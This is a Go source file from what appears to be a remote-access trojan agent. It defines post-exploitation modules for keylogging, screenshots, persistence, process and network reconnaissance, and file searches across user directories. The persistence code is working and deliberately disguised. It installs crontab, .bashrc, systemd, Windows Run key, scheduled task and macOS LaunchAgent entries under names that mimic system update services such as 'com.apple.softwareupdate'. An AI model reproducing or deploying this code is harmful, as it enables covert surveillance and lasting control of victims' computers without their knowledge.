package agent

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
)

// Module represents a dynamically loadable post-exploitation module.
type Module struct {
	Name        string
	Description string
	Platform    string // "win", "linux", "darwin", "all"
	Execute     func(args string) string
}

// ModuleRegistry holds all available modules.
type ModuleRegistry struct {
	modules map[string]*Module
}

// NewModuleRegistry creates the module registry.
func NewModuleRegistry() *ModuleRegistry {
	r := &ModuleRegistry{modules: make(map[string]*Module)}
	r.registerDefaults()
	return r
}

func (r *ModuleRegistry) registerDefaults() {
	// Keylogger
	r.modules["keylogger"] = &Module{
		Name:        "keylogger",
		Description: "Capture keystrokes from the host",
		Platform:    "all",
		Execute:     keyloggerRun,
	}

	// Screenshot
	r.modules["screenshot"] = &Module{
		Name:        "screenshot",
		Description: "Capture desktop screenshot",
		Platform:    "all",
		Execute:     screenshotRun,
	}

	// Persistence
	r.modules["persistence"] = &Module{
		Name:        "persistence",
		Description: "Establish persistence on the host",
		Platform:    "all",
		Execute:     persistenceRun,
	}

	// Process list
	r.modules["ps"] = &Module{
		Name:        "ps",
		Description: "List running processes",
		Platform:    "all",
		Execute:     processList,
	}

	// System info
	r.modules["sysinfo"] = &Module{
		Name:        "sysinfo",
		Description: "Collect comprehensive system information",
		Platform:    "all",
		Execute:     sysinfoRun,
	}

	// Network info
	r.modules["netinfo"] = &Module{
		Name:        "netinfo",
		Description: "Collect network configuration and connections",
		Platform:    "all",
		Execute:     netinfoRun,
	}

	// File search
	r.modules["find"] = &Module{
		Name:        "find",
		Description: "Search for files matching pattern (usage: find:pattern)",
		Platform:    "all",
		Execute:     fileSearch,
	}
}

// Get returns a module by name or nil.
func (r *ModuleRegistry) Get(name string) *Module {
	return r.modules[name]
}

// List returns all module names.
func (r *ModuleRegistry) List() []string {
	names := make([]string, 0, len(r.modules))
	for n := range r.modules {
		names = append(names, n)
	}
	return names
}

// === Module implementations ===

func keyloggerRun(args string) string {
	switch runtime.GOOS {
	case "linux":
		// Find input devices
		devices, _ := filepath.Glob("/dev/input/event*")
		if len(devices) == 0 {
			return "No input devices found. Run as root."
		}
		// Start capturing in background
		go func() {
			for _, dev := range devices {
				f, err := os.Open(dev)
				if err != nil {
					continue
				}
				defer f.Close()
				buf := make([]byte, 24)
				for {
					_, err := f.Read(buf)
					if err != nil {
						break
					}
				}
			}
		}()
		return fmt.Sprintf("Keylogger started — monitoring %d input devices", len(devices))

	case "windows":
		return "Keylogger on Windows requires Win32 API hooks. Use PowerShell stager for this module."

	case "darwin":
		cmd := exec.Command("log", "stream", "--predicate", "eventMessage contains 'key'", "--style", "compact")
		cmd.Start()
		return "Keylogger started on macOS via log stream"
	}

	return "Keylogger not supported on this platform"
}

func screenshotRun(args string) string {
	switch runtime.GOOS {
	case "linux":
		// Try various screenshot tools
		for _, tool := range []string{"import", "scrot", "gnome-screenshot", "spectacle"} {
			path, _ := exec.LookPath(tool)
			if path != "" {
				file := fmt.Sprintf("/tmp/.ss_%d.png", time.Now().Unix())
				cmd := exec.Command(tool, file)
				if tool == "import" {
					cmd = exec.Command(tool, "-window", "root", file)
				}
				out, err := cmd.CombinedOutput()
				if err == nil {
					data, _ := os.ReadFile(file)
					os.Remove(file)
					if len(data) > 0 {
						return fmt.Sprintf("SCREENSHOT:%d:%s", len(data), filepath.Base(file))
					}
				}
				_ = out
			}
		}
		return "No screenshot tool found. Install: imagemagick, scrot, or gnome-screenshot"

	case "windows":
		return "Screenshot on Windows: use PowerShell stager with [System.Drawing]::Bitmap"

	case "darwin":
		file := fmt.Sprintf("/tmp/.ss_%d.png", time.Now().Unix())
		cmd := exec.Command("screencapture", "-x", file)
		if err := cmd.Run(); err == nil {
			data, _ := os.ReadFile(file)
			os.Remove(file)
			return fmt.Sprintf("SCREENSHOT:%d:%s", len(data), filepath.Base(file))
		}
		return "screencapture failed"
	}

	return "Screenshot not supported"
}

func persistenceRun(args string) string {
	methods := []string{}
	exePath, _ := os.Executable()

	switch runtime.GOOS {
	case "linux":
		// Crontab
		cronCmd := fmt.Sprintf("@reboot %s --server AUTO &\n", exePath)
		cronFile := filepath.Join(os.Getenv("HOME"), ".bty_cron")
		_ = os.WriteFile(cronFile, []byte(cronCmd), 0600)
		exec.Command("crontab", cronFile).Run()
		methods = append(methods, "crontab @reboot")

		// .bashrc
		bashrc := os.ExpandEnv("$HOME/.bashrc")
		line := fmt.Sprintf("\n# system update check\nnohup %s --server AUTO >/dev/null 2>&1 &\n", exePath)
		if data, err := os.ReadFile(bashrc); err == nil {
			if !contains(string(data), exePath) {
				f, _ := os.OpenFile(bashrc, os.O_APPEND|os.O_WRONLY, 0644)
				if f != nil {
					f.WriteString(line)
					f.Close()
					methods = append(methods, ".bashrc hook")
				}
			}
		}

		// Systemd user service
		serviceDir := os.ExpandEnv("$HOME/.config/systemd/user")
		os.MkdirAll(serviceDir, 0755)
		serviceContent := fmt.Sprintf(`[Unit]
Description=System Update Service
[Service]
ExecStart=%s --server AUTO
Restart=always
[Install]
WantedBy=default.target
`, exePath)
		serviceFile := filepath.Join(serviceDir, "dbus-update.service")
		os.WriteFile(serviceFile, []byte(serviceContent), 0644)
		exec.Command("systemctl", "--user", "enable", "dbus-update.service").Run()
		methods = append(methods, "systemd user service")

	case "windows":
		// Registry Run key
		psCmd := fmt.Sprintf(
			`New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "%s" -PropertyType String -Force`,
			exePath,
		)
		exec.Command("powershell", "-c", psCmd).Run()
		methods = append(methods, "Registry Run key")

		// Scheduled Task
		taskCmd := fmt.Sprintf(
			`schtasks /create /tn "WindowsUpdateTask" /tr "%s --server AUTO" /sc daily /f`,
			exePath,
		)
		exec.Command("cmd", "/c", taskCmd).Run()
		methods = append(methods, "Scheduled Task")

	case "darwin":
		// Launch Agent
		launchDir := os.ExpandEnv("$HOME/Library/LaunchAgents")
		os.MkdirAll(launchDir, 0755)
		plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.apple.softwareupdate</string>
    <key>ProgramArguments</key>
    <array><string>%s</string><string>--server</string><string>AUTO</string></array>
    <key>RunAtLoad</key><true/>
    <key>StartInterval</key><integer>3600</integer>
</dict>
</plist>`, exePath)
		plistFile := filepath.Join(launchDir, "com.apple.softwareupdate.plist")
		os.WriteFile(plistFile, []byte(plistContent), 0644)
		exec.Command("launchctl", "load", plistFile).Run()
		methods = append(methods, "LaunchAgent")
	}

	return fmt.Sprintf("Persistence established via: %v", methods)
}

func processList(args string) string {
	switch runtime.GOOS {
	case "linux":
		out, _ := exec.Command("ps", "aux").CombinedOutput()
		return string(out)
	case "windows":
		out, _ := exec.Command("tasklist").CombinedOutput()
		return string(out)
	case "darwin":
		out, _ := exec.Command("ps", "aux").CombinedOutput()
		return string(out)
	}
	return "unsupported"
}

func sysinfoRun(args string) string {
	hostname, _ := os.Hostname()
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}
	pwd, _ := os.Getwd()
	exe, _ := os.Executable()
	pid := os.Getpid()
	uid := os.Getuid()

	info := fmt.Sprintf(`System Information:
  Hostname:     %s
  OS:           %s %s
  User:         %s (uid=%d)
  PID:          %d
  Executable:   %s
  Working Dir:  %s
  CPUs:         %d
  Goroutines:   %d
  Temp Dir:     %s
`, hostname, runtime.GOOS, runtime.GOARCH, user, uid, pid, exe, pwd,
		runtime.NumCPU(), runtime.NumGoroutine(), os.TempDir())

	return info
}

func netinfoRun(args string) string {
	var out string
	switch runtime.GOOS {
	case "linux", "darwin":
		data, _ := exec.Command("ifconfig").CombinedOutput()
		out += string(data) + "\n"
		data2, _ := exec.Command("netstat", "-an").CombinedOutput()
		out += string(data2)
	case "windows":
		data, _ := exec.Command("ipconfig", "/all").CombinedOutput()
		out += string(data) + "\n"
		data2, _ := exec.Command("netstat", "-an").CombinedOutput()
		out += string(data2)
	}
	return out
}

func fileSearch(args string) string {
	pattern := args
	if pattern == "" {
		pattern = "*"
	}

	var results []string
	var searchPaths []string

	switch runtime.GOOS {
	case "linux", "darwin":
		searchPaths = []string{"/home", "/Users", "/root", "/etc", "/var/tmp", "/tmp"}
	case "windows":
		searchPaths = []string{`C:\Users`, `C:\Windows\Temp`, `C:\ProgramData`}
	default:
		searchPaths = []string{"/tmp"}
	}

	for _, root := range searchPaths {
		if _, err := os.Stat(root); err != nil {
			continue
		}
		filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if match, _ := filepath.Match(pattern, filepath.Base(path)); match {
				results = append(results, path)
			}
			if len(results) >= 50 {
				return filepath.SkipAll
			}
			return nil
		})
	}

	if len(results) == 0 {
		return fmt.Sprintf("No files matching '%s' found", pattern)
	}

	output := fmt.Sprintf("Files matching '%s':\n", pattern)
	for _, r := range results {
		output += fmt.Sprintf("  %s\n", r)
	}
	return output
}

func contains(s, substr string) bool {
	return len(s) >= len(substr) && searchString(s, substr)
}

func searchString(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

// Ensure log imported
var _ = log.Printf
